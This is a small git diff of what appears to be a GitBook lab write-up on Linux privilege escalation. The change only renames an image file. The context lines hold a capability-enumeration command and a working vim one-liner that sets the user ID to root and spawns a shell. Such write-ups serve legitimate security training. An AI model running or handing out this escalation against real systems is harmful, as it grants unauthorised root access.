@@ -200,7 +200,7 @@ getcap -r / 2>/dev/null
 /home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
 
-<figure><img src="../../.gitbook/assets/image (56) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (56) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
